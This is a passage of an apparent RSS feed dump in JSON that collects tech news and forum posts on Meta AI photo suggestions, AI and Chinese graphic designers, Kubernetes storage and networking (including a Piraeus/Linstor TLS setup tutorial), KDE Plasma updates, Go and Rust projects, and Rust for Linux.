href=\"https://www.goodwinlaw.com/en/insights/publications/2025/05/insights-otherindustries-training-of-metas-ai-systems\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">opt out</a>.)</p><p>Reached for comment, Meta spokesperson Maria Cubeta confirmed the feature is a test, saying, “We’re exploring ways to make content sharing easier for people on Facebook by testing suggestions of ready-to-share and curated content from a person’s camera roll.”</p><p>“These suggestions are opt-in only and only shown to you – unless you decide to share them – and can be turned off at any time,” she continued. “Camera roll media may be used to improve these suggestions, but are not used to improve AI models in this test.”</p><p>The company is currently testing suggestions in the U.S. and Canada. </p><p><em>Updated after publication with Facebook’s comments. </em></p>","contentLength":4970,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lmm5bd/facebook_is_asking_to_use_meta_ai_on_photos_in/"},{"title":"[Media] Rust unikernel for running WebAssembly in a custom VM to prototype new sandboxing techniques! Custom C/C++ standard library implementation, custom userspace ABI, and can compile native programs from C/C++/Rust/AssemblyScript out-of-the-box, happy to answer any questions!","url":"https://www.reddit.com/r/rust/comments/1lmlhy6/media_rust_unikernel_for_running_webassembly_in_a/","date":1751113222,"author":"/u/IntegralPilot","guid":174454,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Graphic artists in China push back on AI and its averaging effect","url":"https://www.theverge.com/ai-artificial-intelligence/688645/graphic-artists-china-ai","date":1751111882,"author":"/u/F0urLeafCl0ver","guid":174527,"unread":true,"content":"<div><p>Sendi Jia, a designer running her own studio between Beijing, China, and London, England, says she mainly uses AI generators like<a href=\"https://www.theverge.com/23162454/openai-dall-e-image-generation-tool-creative-revolution\"> DALL-E</a> to make fake photos for background panels or websites when her clients don’t have access to real ones. That’s helped clients with limited budgets, but it’s also exposed just how much of the creative process AI can replace. Recently, a potential client working in a university contacted Jia about creating the logo for a new project. Then, they changed their mind. They had used AI to make it, they said.</p></div><div><p>Chinese graphic artists are rapidly experiencing the impact of image generators on their day-to-day work: the technology enables copycats and profoundly shifts clients’ perception of their work, specifically in terms of how much that work costs and how much time it takes to produce. Freelance artists or designers working in industries with clients that invest in stylized, eye-catching graphics, like advertising, are particularly at risk.</p></div><div><p>Long before AI image generators became popular, graphic designers at major tech companies and in-house designers for large corporate clients were often instructed by managers to crib aesthetics from competitors or from social media, according to one employee at a major online shopping platform in China, who asked to remain anonymous for fear of retaliation from their employer.</p></div><div><p>Where a human would need to understand and reverse engineer a distinctive style to recreate it, AI image generators simply create randomized mutations of it. Often, the results will look like obvious copies and include errors, but other graphic designers can then edit them into a final product.</p></div><div><p>“I think it’d be easier to replace me if I didn’t embrace [AI],” the shopping platform employee says. Early on, as tools like Stable Diffusion and Midjourney became more popular, their colleagues who spoke English well were selected to study AI image generators to increase in-house expertise on how to write successful prompts and identify what types of tasks AI was useful for. Ultimately, it was useful for copying styles from popular artists that, in the past, would take more time to study. </p></div><div><p>“I think it forces both designers and clients to rethink the value of designers,” Jia says. “Is it just about producing a design? Or is it about consultation, creativity, strategy, direction, and aesthetic?”</p></div><div><div><p>“You might get a good result, but there will inevitably be dozens or even hundreds of poor ones … Personally, I see [AI image generators] as more of a toy than a tool.”</p></div></div><div><p>At ad agencies, for example, graphic designers work on comprehensive strategies for campaigns, aiming to create iconic, recognizable visual identities across a variety of formats. As such, AI image generators are less useful because they don’t produce anything particularly unique, according to Erbing, a graphic designer in Beijing who has worked with several ad agencies and asked to be called by his nickname.</p></div><div><p>“Each project faces different problems, and designers are there to solve specific problems, not to create identical visuals,” he says. “Sometimes, the process of thinking through a project takes longer than actually creating the visuals.”</p></div><div><p>When faced with more complex tasks, AI’s utility dwindles. Image generators are capable of creating many images, but that does not replace the work of understanding what an ad campaign needs to establish a visual identity and communicate what it is the client is selling and why people should buy it. Then, translating those concepts to the AI productively is its own challenge. Among graphic designers in China, there’s a joke that using an AI image generator is like <a href=\"https://www.theverge.com/games/605811/infinity-nikki-gacha-mechanics\">gacha</a>, referring to<a href=\"https://www.theverge.com/games/650316/i-cant-believe-how-many-japanese-adults-spent-their-rent-money-on-gacha-pulls\"> addictive games</a> where users spend money to receive randomized items and find out what they won.</p></div><div><p>“You might get a good result, but there will inevitably be dozens or even hundreds of poor ones,” Erbing says. “Personally, I see [AI image generators] as more of a toy than a tool.”</p></div><div><p>Across the board, though, artists and designers say that AI hype has negatively impacted clients’ view of their work’s value. Now, clients expect a graphic designer to produce work on a shorter timeframe and for less money, which also has its own averaging impact, lowering the ceiling for what designers can deliver. As clients lower budgets and squish timelines, the quality of the designers’ output decreases.</p></div><div><p>“There is now a significant misperception about the workload of designers,” Erbing says. “Some clients think that since AI must have improved efficiency, they can halve their budget.”</p></div><div><p>But this perception runs contrary to what designers spend the majority of their time doing, which is not necessarily just making any image, Erbing says.</p></div><div><p>Erbing, like other designers, hopes AI image generators can become more useful to graphic designers in the future, and notes that people’s perception of their usefulness outpaces their actual application. In the meanwhile, it is twisting the clients’ view of the usefulness of the artists themselves.</p></div>","contentLength":5059,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lml36s/graphic_artists_in_china_push_back_on_ai_and_its/"},{"title":"A Bitcask Inspired Local Disk Cache for Avoiding Unnecessary Redis Hits","url":"https://www.reddit.com/r/golang/comments/1lml2j3/a_bitcask_inspired_local_disk_cache_for_avoiding/","date":1751111818,"author":"","guid":174395,"unread":true,"content":"<p>We spend so much time thinking about Redis and Memcached for caching that we forget about the disk sitting right there on our servers.</p><p>Every API call to a remote cache means network latency. Every network hop adds milliseconds. In high-throughput applications, those milliseconds compound quickly.</p><p>Local caching isn't just about performance, it's about reducing dependencies. When your remote cache goes down or network gets congested, your local cache still works. It's a fallback that's always available.</p><p>That's why I'm building Ignite, not a database, but an SDK to efficiently read and write to your filesystem. Think of it as a smart way to use your local disk as a caching layer before hitting Redis or making database calls.</p><p>It's not about replacing your existing infrastructure. It's about using resources you already have more strategically. Every server has a disk and memory. Why not leverage them before making that network call?</p><p>The architecture is inspired by Bitcask, append-only writes with in-memory indexes pointing to exact file locations. O(1) lookups, no network overhead, just direct disk access. TTL support handles expiration automatically.</p><p>The project is still in development. Right now it handles writing to disk reliably, but I'm gradually adding recovery mechanisms, hint files for index persistence, and compaction.</p>","contentLength":1338,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Simple and easy to set up logging","url":"https://www.reddit.com/r/kubernetes/comments/1lmjvnh/simple_and_easy_to_set_up_logging/","date":1751107597,"author":"/u/Fast_Airplane","guid":174356,"unread":true,"content":"<p>I'm running a small appplication on a self-managed hetzner-k3s cluster and want to somehow centralize all application logs (usually everything is logged to stdout in the container) for persisting them when pods are recreated.</p><p>Everything should stay inside the cluster or be selfhostable, since I can't ship the logs externally due to privacy concerns.</p><p>Is there a simple and easy solution to achieve this? I saw Grafana Loki is quite popular these days, but what would i use to ship the logs there (Fluentbit/Fluentd/Promtail/...)?</p>","contentLength":528,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"cilium in dual-stack on-prem cluster","url":"https://www.reddit.com/r/kubernetes/comments/1lmjkow/cilium_in_dualstack_onprem_cluster/","date":1751106414,"author":"/u/G4rp","guid":174393,"unread":true,"content":"<p>I'm trying to learning Cilium. I have RPi two nodes cluster freshly installed in dual-stack mode. I installed disabling flannel and using following switches <code>--cluster-cidr=10.42.0.0/16,fd12:3456:789a:14::/56 --service-cidr=10.43.0.0/16,fd12:3456:789a:43::/112</code></p><p>Cilium is deployed with helm and following values:</p><pre><code>kubeProxyReplacement: true ipv6: enabled: false ipv6NativeRoutingCIDR: \"fd12:3456:789a:14::/64\" ipam: mode: cluster-pool operator: clusterPoolIPv4PodCIDRList: - \"10.42.0.0/16\" clusterPoolIPv4MaskSize: 24 clusterPoolIPv6PodCIDRList: - \"fd12:3456:789a:14::/56\" clusterPoolIPv6MaskSize: 56 k8s: requireIPv4PodCIDR: false requireIPv6PodCIDR: false externalIPs: enabled: true nodePort: enabled: true bgpControlPlane: enabled: false </code></pre><p>I'm getting the following error on the cilium pods:</p><pre><code>time=\"2025-06-28T10:08:27.652708574Z\" level=warning msg=\"Waiting for k8s node information\" error=\"required IPv6 PodCIDR not available\" subsys=daemon </code></pre><p>If I disable ipv6 everything is working. I'm doing for learning purpose, I don't really need ipv6. and I'm using ULA address space. Both my nodes they have an ipv6 also in the ULA address space.</p>","contentLength":1130,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I don't understand people who distrohop when their distro makes a slightly bad decision","url":"https://www.reddit.com/r/linux/comments/1lmj8xy/i_dont_understand_people_who_distrohop_when_their/","date":1751105093,"author":"/u/Nervous-Diamond629","guid":174361,"unread":true,"content":"<p>There is someone else i know who dropped Linux Mint in 2017-2018 for Kubuntu because they dropped KDE(Perfectly fine decision).</p><p>Then in 2021, he went on this Ubuntu bashing trend(He said canonical is outdated, typical excuse to distrohop), and went to Fedora and started annoyingly pedaling it online even when the discussion wasn't about Ubuntu or related to it.</p><p>Now, in 2025, he's complaining that every KDE and Linux update is bloated and that he's now switching to BSD. He accused Linux of trying to be like Microsoft. </p><p>He will probably hop to BSD, complain that his drivers don't work and move to something else(You guessed, something like Temple OS).</p><p>Honestly, if you're the type of person that doesn't even think of the OS when doing your work, don't distrohop like mad. Don't switch because of trends. Because you will be setting yourself up for disappointment. </p>","contentLength":866,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"This Week in Plasma: inertial scrolling, RDP clipboard syncing, and more session restore","url":"https://blogs.kde.org/2025/06/28/this-week-in-plasma-inertial-scrolling-rdp-clipboard-syncing-and-more-session-restore/","date":1751104688,"author":"/u/diegodamohill","guid":174528,"unread":true,"content":"<p>Welcome to a new issue of </p><p>Every week we cover the highlights of what’s happening in the world of KDE Plasma and its associated apps like Discover, System Monitor, and more.</p><p>This week we not only continued polishing up Plasma 6.4 in response to feedback (thanks to everyone who submitted bug reports and wrote nice emails to us), but we also started work on bigger improvements to Plasma 6.5.</p><p>Probably the biggest one is the next piece of the Wayland session restore puzzle clicking into place: David Edmundson has <a href=\"https://codereview.qt-project.org/c/qt/qtbase/+/649886\">implemented support</a> for the  Wayland session restore protocol in Qt 6.10! This means that software built on top of Qt 6.10 (for example, Plasma and KDE apps) will be able to start implementing the protocol themselves. Once they do, then finally  session restore will work on Wayland. We're not all the way there yet, but we keep on working to get closer all the time!</p><p>But that’s not it! We’ve got a whole lot more, too…</p><p>Plasma’s Welcome Center apps now teaches you about the many keyboard shortcuts in Plasma, as well as what the heck the “Meta” key is. (Nate Graham, <a href=\"https://invent.kde.org/plasma/plasma-welcome/-/merge_requests/213\">link</a>)</p><p>Plasma’s built-in RDP server now supports syncing clipboard text between the client and server. (Arjen Hiemstra, <a href=\"https://invent.kde.org/plasma/krdp/-/merge_requests/82\">link</a>)</p><p>Refined the tone mapping feature in KWin to improve the look of some screen content when using HDR or EDR. (Xaver Hugl, <a href=\"https://invent.kde.org/plasma/kwin/-/merge_requests/7809\">link</a>)</p><p>You can no longer open an infinite number of error messages in Spectacle’s UI by repeatedly doing a thing that triggers them, and then not stopping even though maybe you should. (Noah Davis, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505784\">link</a>)</p><p>Spectacle no longer includes a ghostly semi-transparent version of its own menus in screenshots taken within the app when not using any kind of delay. (Ismael Asensio, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505803\">link</a>)</p><p>The “New!” badges applied to newly-installed apps shown in the Kickoff Application Launcher are now more appealing and easier to read by using semantically correct colors from the active color scheme. (Kai Uwe Broulik, <a href=\"https://invent.kde.org/plasma/plasma-desktop/-/merge_requests/3074\">link 1</a> and <a href=\"https://invent.kde.org/plasma/libplasma/-/merge_requests/1328\">link 2</a>)</p><p>In the Kicker Application Menu widget, you can now activate the power/session actions using the  key, in addition to the  key. Now all the UI elements on that widget can be activated with . (Christoph Wolk, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505542\">link</a>)</p><p>Made the Night Light feature’s color tinting look nicer on certain hardware. (Xaver Hugl, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505495\">link</a>)</p><p>The notification telling you that you missed some notifications while you were in Do Not Disturb mode now includes a button you can click on to actually see those missed notifications! (Kristen McWilliam, <a href=\"https://bugs.kde.org/show_bug.cgi?id=502423\">link</a>)</p><p>You can now copy the QR code for clipboard items, in addition to just being able to look at them and scan them. (Ismael Asensio, <a href=\"https://invent.kde.org/plasma/plasma-workspace/-/merge_requests/5617\">link</a>)</p><p>The “Click here to change the icon” button that’s visible on the Properties window and other QtWidgets-based apps is now more obvious as to what its purpose is. (Kai Uwe Broulik, <a href=\"https://invent.kde.org/plasma/breeze/-/merge_requests/548\">link 1</a> and <a href=\"https://invent.kde.org/frameworks/kiconthemes/-/merge_requests/185\">link 2</a>)</p><p>The Networks widget now tells you what what it’s doing for more more potential states that it can be in, including “looking for wireless networks” and “uh, I’ve been disabled, dude.” (Nate Graham, <a href=\"https://invent.kde.org/plasma/plasma-nm/-/merge_requests/439\">link</a>)</p><p>System Settings’ Printers page also now gives you a better error message if its service has been disabled. (Mike Noe, <a href=\"https://invent.kde.org/plasma/print-manager/-/merge_requests/258\">link</a>)</p><p>On System Settings’ Region &amp; Language page, the error message that tells you language packages couldn’t be installed now actually mentions their names so you can try to troubleshoot it a bit. (Ismael Asensio, <a href=\"https://invent.kde.org/plasma/plasma-workspace/-/merge_requests/5622\">link</a>)</p><p>All scrollable views in all QtQuick-based KDE software now have inertial scrolling when scrolled using a touchpad! Note: only with a touchpad, not with a mouse wheel. No inertia there. Say it with me: no inertia for mouse wheels! (Niccolò Venerandi, <a href=\"https://bugs.kde.org/show_bug.cgi?id=456383\">link</a>)</p><p>Improved the accessibility of the common Properties dialog in many ways. (Felix Ernst, <a href=\"https://invent.kde.org/frameworks/kio/-/merge_requests/1916\">link 1</a> and <a href=\"https://invent.kde.org/frameworks/kio/-/merge_requests/1918\">link 2</a>)</p><p>Made the Environment Canada provider for Plasma’s Weather Report widget work again after they changed the data format. (Ismael Asensio, <a href=\"https://invent.kde.org/plasma/plasma-workspace/-/merge_requests/5615\">link</a>)</p><p>Fixed several crashes in in KDE’s desktop portal implementations. (David Redondo, <a href=\"https://invent.kde.org/plasma/xdg-desktop-portal-kde/-/merge_requests/410\">link 1</a> and <a href=\"https://invent.kde.org/plasma/xdg-desktop-portal-kde/-/merge_requests/412\">link 2</a>)</p><p>If you have a Samsung Odyssey G5 monitor, it no longer turns on and off forever while Powerdevil’s DDC support is enabled, because the monitor’s own DDC implementation is completely broken, so we blacklisted it. (Xaver Hugl, <a href=\"https://bugs.kde.org/show_bug.cgi?id=494522\">link</a>)</p><p>Fixed an accessibility regression that caused the Install and Remove buttons on Discover’s app pages to be excluded from the tab focus chain. (Christoph Wolk, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505544\">link</a>)</p><p>Deleting a file or app that’s been made a favorite in Kicker/Kickoff/etc no longer makes it impossible to un-favorite that thing. (Christoph Wolk, <a href=\"https://bugs.kde.org/show_bug.cgi?id=402820\">link</a>)</p><p>Fixed an issue in the Window List widget that prevented it from being able to minimize or maximize windows. (Christoph Wolk, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505901\">link</a>)</p><p>Fixed an issue in KDE’s desktop portal-based open/save dialog that caused extra UI elements added by apps to appear in the wrong places. (David Redondo, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505746\">link</a>)</p><p>Fixed an issue with the new “relative mode” for drawing tablet styluses that could cause the pointer to disappear when you have  tablets connected at the same time and each of them uses a different input mode. (Vlad Zahorodnii, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505989\">link</a>)</p><p>Fixed two visual glitches that could be caused by re-arranging virtual desktops in the Overview effect’s grid view. (Vlad Zahorodnii, <a href=\"https://bugs.kde.org/show_bug.cgi?id=506022\">link 1</a> and <a href=\"https://invent.kde.org/plasma/kwin/-/merge_requests/7812\">link 2</a>)</p><p>Fixed an issue that made clicking on Plasma UI elements unreliable when using certain non-default click modes. (Vlad Zahorodnii, <a href=\"https://bugs.kde.org/show_bug.cgi?id=506007\">link</a>)</p><p>Fixed a case where System Settings’ Flatpak App Permissions page could cause the whole app to crash (Daniel Hast, <a href=\"https://invent.kde.org/plasma/flatpak-kcm/-/merge_requests/148\">link</a>)</p><p>Fixed an issue that could sometimes cause Plasma to go back to sleep again right after waking up, when the “Sleep then hibernate” setting is in use. (Myrrh Periwinkle, <a href=\"https://invent.kde.org/plasma/powerdevil/-/merge_requests/556\">link</a>)</p><p>The appearance of text labels in Folder View pop-ups is once again correct. (Nate Graham, <a href=\"https://invent.kde.org/plasma/plasma-desktop/-/merge_requests/3079\">link 1</a> and <a href=\"https://invent.kde.org/plasma/plasma-desktop/-/merge_requests/3086\">link 2</a>)</p><p>You’re no longer erroneously prompted to authenticate for a Wireguard VPN whose credentials are already stored in KWallet, and the wallet is set up to automatically open at login. (Jeff Chien, <a href=\"https://bugs.kde.org/show_bug.cgi?id=494264\">link</a>)</p><p>Fixed an issue in the KDE desktop portal’s screenshot implementation that prevented the delay setting from taking effect. (David Redondo, <a href=\"https://bugs.kde.org/show_bug.cgi?id=496964\">link</a>)</p><p>Missing app backends listed in Discover’s Settings page once again show the correct names. (Harald Sitter, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505700\">link</a>)</p><p>The brightness level shown on System Settings’ Display &amp; Monitor page now matches the one shown in Plasma. (Xaver Hugl, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505763\">link</a>)</p><p>Fixed an issue that caused the panel to have too much space in it until restarting Plasma if you stop displaying the date on a horizontally-laid-out Digital Clock widget. (Niccolò Venerandi, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505614\">link</a>)</p><p>Fixed a Qt bug that caused is to be extremely frustrating to re-arrange Task Manager icons because the drag target would change after you dragged an icon over another one. (Niccolò Venerandi, <a href=\"https://bugs.kde.org/show_bug.cgi?id=500293\">link</a>)</p><p>Fixed an issue that could cause stuttering when playing video content in certain video players when using a variable-refresh-rate screen. (Błażej Szczygieł, <a href=\"https://invent.kde.org/plasma/kwin/-/merge_requests/7804\">link</a>)</p><p>Fixed a recent performance regression with certain games. (Vlad Zahorodnii, <a href=\"https://bugs.kde.org/show_bug.cgi?id=505954\">link</a>)</p><p>Increased the perceived responsiveness of logging into Plasma by optimizing the splash screen code and re-arranging some of the startup steps. (Vlad Zahorodnii, <a href=\"https://invent.kde.org/plasma/plasma-workspace/-/merge_requests/5628\">link 1</a> and <a href=\"https://invent.kde.org/plasma/plasma-workspace/-/merge_requests/5627\">link 2</a>)</p><p>Slightly reduced the duration of the login animation, which makes logging into Plasma feel a bit snappier. (Vlad Zahorodnii, <a href=\"https://invent.kde.org/plasma/kwin/-/merge_requests/7823\">link</a>)</p><p>KDE has become important in the world, and your time and contributions have helped us get there. As we grow, we need your support to keep KDE sustainable.</p><p>You can help KDE by becoming an active community member and <a href=\"https://community.kde.org/Get_Involved\">getting involved</a> somehow. Each contributor makes a huge difference in KDE — you are not a number or a cog in a machine!</p><p>You don’t have to be a programmer, either. Many other opportunities exist:</p><p>You can also help us by <a href=\"https://kde.org/donate\">making a donation!</a> Any monetary contribution — however small — will help us cover operational costs, salaries, travel expenses for contributors, and in general just keep KDE bringing Free Software to the world.</p><p>Enter your email address to follow this blog and receive notifications of new posts by email.</p>","contentLength":8026,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lmj54z/this_week_in_plasma_inertial_scrolling_rdp/"},{"title":"Piraeus on Kubernetes","url":"https://nanibot.net/posts/piraeus","date":1751104293,"author":"/u/-NaniBot-","guid":174329,"unread":true,"content":"<div><p>I’ve been a big fan of Rook for simplifying storage on Kubernetes. Sure, CEPH is complex but the Rook operator makes it very easy to get a CEPH cluster up and running on Kubernetes. However, it’s common knowledge that CEPH is usually meant for large clusters and is resource intensive.</p><p>I’ve been wanting to try out Linstor for quite some time now. In this blog post, we’ll use the Piraeus Operator to deploy a Linstor cluster and use it to provision volumes on our Kubernetes cluster.</p><p>We’ll also ensure that TLS is configured for communication between the components.</p><p>Linstor depends on the DRBD kernel module. You will need to ensure that the kernel module is loaded before you attempt to install the operator and configure a cluster.</p><p>On Talos, this is how you’d do it:</p><ol><li><p>Use the following patches to load the kernel module(s).</p></li></ol><pre tabindex=\"0\"><code>machine:\n  kernel:\n    modules:\n      - name: drbd\n        parameters:\n          - usermode_helper=disabled\n      - name: drbd_transport_tcp\n      - name: dm-thin-pool\n</code></pre><ol start=\"3\"><li>Verify that the module(s) are loaded:</li></ol><pre tabindex=\"0\"><code>talosctl --talosconfig talosconfig -n 192.168.16.12 get modules\n</code></pre><pre tabindex=\"0\"><code>NODE            NAMESPACE   TYPE               ID                   VERSION\n192.168.16.12   runtime     KernelModuleSpec   dm-thin-pool         1\n192.168.16.12   runtime     KernelModuleSpec   drbd                 1\n192.168.16.12   runtime     KernelModuleSpec   drbd_transport_tcp   1\n</code></pre><p>Follow the official instructions here: <a href=\"https://piraeus.io/docs/v2.8.1/upgrade/migration/4-install-operator-v2/\">Link</a></p><ol><li>Generate the required certificates using cert-manager (we’ll use these certificates to enable TLS communication between the various components)</li></ol><pre tabindex=\"0\"><code>---\napiVersion: cert-manager.io/v1\nkind: Issuer\nmetadata:\n  name: ca-bootstrapper\n  namespace: piraeus-datastore\nspec:\n  selfSigned: { }\n---\napiVersion: cert-manager.io/v1\nkind: Certificate\nmetadata:\n  name: linstor-internal-ca\n  namespace: piraeus-datastore\nspec:\n  commonName: linstor-internal-ca\n  secretName: linstor-internal-ca\n  duration: 87600h\n  isCA: true\n  usages:\n    - signing\n    - key encipherment\n    - cert sign\n  issuerRef:\n    name: ca-bootstrapper\n    kind: Issuer\n---\napiVersion: cert-manager.io/v1\nkind: Issuer\nmetadata:\n  name: linstor-internal-ca\n  namespace: piraeus-datastore\nspec:\n  ca:\n    secretName: linstor-internal-ca\n---\napiVersion: cert-manager.io/v1\nkind: Certificate\nmetadata:\n  name: linstor-api-ca\n  namespace: piraeus-datastore\nspec:\n  commonName: linstor-api-ca\n  secretName: linstor-api-ca\n  duration: 87600h # 10 years\n  isCA: true\n  usages:\n    - signing\n    - key encipherment\n    - cert sign\n  issuerRef:\n    name: ca-bootstrapper\n    kind: Issuer\n---\napiVersion: cert-manager.io/v1\nkind: Issuer\nmetadata:\n  name: linstor-api-ca\n  namespace: piraeus-datastore\nspec:\n  ca:\n    secretName: linstor-api-ca\n</code></pre><ol start=\"2\"><li>Create the Linstor cluster</li></ol><pre tabindex=\"0\"><code>apiVersion: piraeus.io/v1\nkind: LinstorCluster\nmetadata:\n  name: linstor-cluster\nspec:\n  apiTLS:\n    certManager:\n      name: linstor-api-ca\n      kind: Issuer\n  internalTLS:\n    certManager:\n      name: linstor-internal-ca\n      kind: Issuer\n  properties:\n    - name: DrbdOptions/Net/tls\n      value: \"yes\"\n  nodeAffinity:\n    nodeSelectorTerms:\n      - matchExpressions:\n          - key: node-role.kubernetes.io/control-plane\n            operator: DoesNotExist\n</code></pre><ol start=\"3\"><li>Create the LinstorSatelliteConfiguration</li></ol><pre tabindex=\"0\"><code>apiVersion: piraeus.io/v1\nkind: LinstorSatelliteConfiguration\nmetadata:\n  name: linstor-satellite-configuration\nspec:\n  nodeAffinity:\n    nodeSelectorTerms:\n      - matchExpressions:\n          - key: node-role.kubernetes.io/control-plane\n            operator: DoesNotExist\n  internalTLS:\n    tlsHandshakeDaemon: true\n    certManager:\n      name: linstor-internal-ca\n      kind: Issuer\n  storagePools:\n    - name: volume-group-1\n      lvmThinPool:\n        volumeGroup: vg1\n      source:\n        hostDevices:\n          - /dev/vdb\n  podTemplate:\n    spec:\n      initContainers:\n        - name: drbd-shutdown-guard\n          $patch: delete\n        - name: drbd-module-loader\n          $patch: delete\n      volumes:\n        - name: run-systemd-system\n          $patch: delete\n        - name: run-drbd-shutdown-guard\n          $patch: delete\n        - name: systemd-bus-socket\n          $patch: delete\n        - name: lib-modules\n          $patch: delete\n        - name: usr-src\n          $patch: delete\n        - name: etc-lvm-backup\n          hostPath:\n            path: /var/etc/lvm/backup\n            type: DirectoryOrCreate\n        - name: etc-lvm-archive\n          hostPath:\n            path: /var/etc/lvm/archive\n            type: DirectoryOrCreate\n</code></pre><pre><code>Note: The podTemplate field is required only if you're running Talos\n</code></pre><ol start=\"4\"><li>Create the storage class:</li></ol><pre tabindex=\"0\"><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: piraeus-storage-replicated\n  annotations:\n    storageclass.kubernetes.io/is-default-class: \"true\"\nprovisioner: linstor.csi.linbit.com\nallowVolumeExpansion: true\nvolumeBindingMode: WaitForFirstConsumer\nparameters:\n  linstor.csi.linbit.com/storagePool: volume-group-1\n  linstor.csi.linbit.com/placementCount: \"2\"\n</code></pre><pre tabindex=\"0\"><code>kubectl exec -n piraeus-datastore deploy/linstor-controller -- linstor storage-pool list\n\nkubectl exec -n piraeus-datastore deploy/linstor-controller -- linstor node list\n\nkubectl exec -n piraeus-datastore deploy/linstor-controller -- curl --key /etc/linstor/client/tls.key \\\n--cert /etc/linstor/client/tls.crt --cacert /etc/linstor/client/ca.crt \\\nhttps://linstor-controller.piraeus-datastore.svc:3371/v1/controller/version\n\nkubectl logs -l app.kubernetes.io/component=linstor-satellite -c ktls-utils\n</code></pre></div>","contentLength":5476,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1lmj1nw/piraeus_on_kubernetes/"},{"title":"Do You Know How LLM’s Work?","url":"https://www.reddit.com/r/artificial/comments/1lmitaz/do_you_know_how_llms_work/","date":1751103372,"author":"/u/CommunicationEast972","guid":174394,"unread":true,"content":"<p>Joined this sub thinking it would be tech but it seems like a bunch of people here haven't taken the 10 minutes it would take to understand the core way LLM's work, as in every post there are people who think these platforms are quietly and secretly gaining consciousness?</p><p>I fully expect agi to happen and I think it will happen generally soon like 10-20 years, but it will be a different kind of format. There is nothing in LLMs currently that is not text prediction. There's not even true reasoning.</p><p>Edit: some great counterpoints to me below that may have us all in the middle in the end</p>","contentLength":588,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I am working on a dnd inspired cli game","url":"https://github.com/SofusA/cli-dungeon","date":1751103118,"author":"/u/SofusA","guid":174573,"unread":true,"content":"<p> is a dnd inspired game written in rust. You have to quest, loot and battle various monsters. </p><p>Similar to , but with more focus on loot, dnd rules and you have to implement a script to determine your actions in encounters. </p><p>The game is in a very early stage, but I would love play testing, feedback or contributions!</p>","contentLength":314,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lmir6b/i_am_working_on_a_dnd_inspired_cli_game/"},{"title":"Learning resource for an experienced dev with zero Golang knowledge","url":"https://www.reddit.com/r/golang/comments/1lmi920/learning_resource_for_an_experienced_dev_with/","date":1751101080,"author":"/u/dchahovsky","guid":174295,"unread":true,"content":"<p><em>\"Here's how you install Golang, here's how you print to console, here's how you create a rest endpoint and this is a goroutine. Now go play in production.\"</em></p><p>This is not what I seek. I've been a java-dev for over 10y. And due to the rise of Golang I'd like to upskill in it. </p><p>I don't care about syntax at the moment, this is something that can be learned quickly. I'm more interested in learning about memory management, gc, best practices of structuring large projects so they remain maintainable and readable, best practices of using OOP with go (shere should and where should not), resource managment, extensibility, inheritance/composition/*, safe dependency injection practices, exception tracing and error resolution techniques, etc. In other words, best practices of a good architecture and maintainability in the golang ecosystem. Not to develop bad habits from the start. I'm interested not in what you can do with Golang, but what you should or shouldn't do. Coding java-style with go-syntax will definitely not be a good choice.</p><p>I've seen some promising articles here and there, but maybe there's a good book or a good series of articles for an \"experienced noobie\" in one place, that you can suggest?</p>","contentLength":1207,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"HwameiStor? Any users here?","url":"https://www.reddit.com/r/kubernetes/comments/1lmi3tm/hwameistor_any_users_here/","date":1751100470,"author":"/u/Shanduur","guid":174293,"unread":true,"content":"<p>Hey all, I’ve been on the hunt for a lightweight storage solution that supports volume replication across nodes without the full overhead of something like Rook/Ceph or even Longhorn.</p><p>I stumbled across <a href=\"https://hwameistor.io\">HwameiStor</a> which seems to tick a lot of boxes:</p><ul><li>Lightweight replication across nodes</li><li>Seems easier on resources compared to other options</li></ul><p>My current cluster is pretty humble: - 2x Raspberry Pi 4 (4GB RAM, microSD) - 1x Raspberry Pi 5 (4GB RAM, NVMe SSD via PCIe) - 1x mini PC (x86, 8GB RAM, SATA SSD)</p><p>So I really want something that’s light and lets me prioritize SSD nodes for replication and avoids burning RAM/CPU just to run storage daemons.</p><p>Has anyone here actually used HwameiStor in production or homelab? Any gotchas, quirks, or recurring issues I should know about? How does it behave during node failure, volume recovery, or cluster scaling?</p><p>Would love to hear some first-hand experiences!</p>","contentLength":896,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A Newbie's First Contribution to (Rust for) Linux","url":"https://blog.buenzli.dev/rust-for-linux-first-contrib/","date":1751098002,"author":"/u/senekor","guid":174294,"unread":true,"content":"<p>I recently got into Linux kernel development by rewriting a driver from C to Rust.\nTo support this driver, I needed to add Rust abstractions for kernel APIs written in C.\nSome of this work is making its way upstream and now seems like a good time to write about that experience.</p><p>Because I was a noob when I started (and mostly still am), this post should be pretty approachable for people who don't have any kernel development experience.</p><p>Spoiler alert: Writing the code was the easy part!</p><p>I love Linux as a user.\nI also love Rust, having worked in various domains with it.\nCommand line applications, web apps that run in the browser wit WebAssembly, bare-metal embedded stuff... you name it.\nI 